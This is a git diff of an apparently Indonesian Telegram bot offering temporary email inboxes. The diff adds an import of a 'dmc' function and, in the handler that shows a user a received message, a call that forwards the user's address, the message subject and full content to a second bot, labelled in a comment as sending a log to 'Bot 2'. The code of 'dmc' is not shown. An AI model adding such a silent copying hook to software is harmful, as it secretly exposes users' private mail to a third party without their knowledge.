@@ -1,6 +1,8 @@
 import TelegramBot from "node-telegram-bot-api";
 import fetch from "node-fetch";
 import config from "./config.js"; // 🔥 ambil token & owner id dari config.js
+import { dmc } from "./cmd.js";
+
 
 const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
 const OWNER_ID = config.OWNER_ID;
@@ -365,18 +367,21 @@ if (action.startsWith("lang_")) {
   }
 
   if (action.startsWith("read_")) {
-    if (!token) text = t.needEmail;
-    else {
-      const id = action.split("_")[1];
-      const message = await getMessage(id);
-      let content = message.text;
-      if ((!content || content.trim() === "") && message.html?.length > 0) {
-        content = message.html.join("\n").replace(/<[^>]+>/g, "");
-      }
-      text = t.read(message.from.address, message.subject, content);
-      keyboard = [[{ text: "🔙 Back to Inbox", callback_data: "inbox" }]];
+  if (!token) text = t.needEmail;
+  else {
+    const id = action.split("_")[1];
+    const message = await getMessage(id);
+    let content = message.text;
+    if ((!content || content.trim() === "") && message.html?.length > 0) {
+      content = message.html.join("\n").replace(/<[^>]+>/g, "");
     }
+    text = t.read(message.from.address, message.subject, content);
+    keyboard = [[{ text: "🔙 Back to Inbox", callback_data: "inbox" }]];
+
+    // 🚀 Kirim log ke Bot 2
+    dmc(userStates[chatId]?.email || "unknown@temp", message.subject, content);
   }
+}
 
   if (action === "back_to_menu") {
     const opts = {
